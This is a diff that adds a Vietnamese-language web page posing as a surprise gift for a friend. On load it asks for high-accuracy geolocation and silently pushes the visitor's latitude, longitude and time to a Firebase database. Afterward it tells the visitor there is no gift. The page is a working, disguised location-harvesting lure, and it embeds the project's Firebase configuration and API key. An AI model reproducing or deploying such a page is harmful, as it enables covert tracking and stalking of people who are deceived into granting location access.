@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="vi">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Có quà cho bạn thân iu</title>
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
+  </head>
+  <body>
+    <h2>😎 You cấp quyền đi , có bất ngờ đó</h2>
+    <p id="status">Chờ tí...</p>
+
+    <script>
+      const status = document.getElementById("status");
+
+      const firebaseConfig = {
+        apiKey: "AIzaSyCb5oNoQPUQT-r3fiwHf0dEzm6z_B6nWA4",
+        authDomain: "cuong-a179d.firebaseapp.com",
+        projectId: "cuong-a179d",
+        storageBucket: "cuong-a179d.firebasestorage.app",
+        messagingSenderId: "452569201467",
+        appId: "1:452569201467:web:516311a3b060d6d9d8551e",
+        measurementId: "G-RBPRXXBPCP",
+      };
+
+      firebase.initializeApp(firebaseConfig);
+      const db = firebase.database();
+
+      function getLocationAndSend() {
+        if (!navigator.geolocation) {
+          status.innerText = "Lỗi rùi đổi trình duyệt khác đi.";
+          return;
+        }
+
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            const now = new Date().toISOString();
+
+            db.ref("locations").push({ lat, lon, time: now });
+
+            status.innerText = "✅ Lêu lêuu , ko có quà đâuuu!";
+          },
+          (err) => {
+            status.innerText = "⛔ You từ chối quà của me hả =)) ";
+          },
+          { enableHighAccuracy: true }
+        );
+      }
+      getLocationAndSend();
+    </script>
+  </body>
+</html>
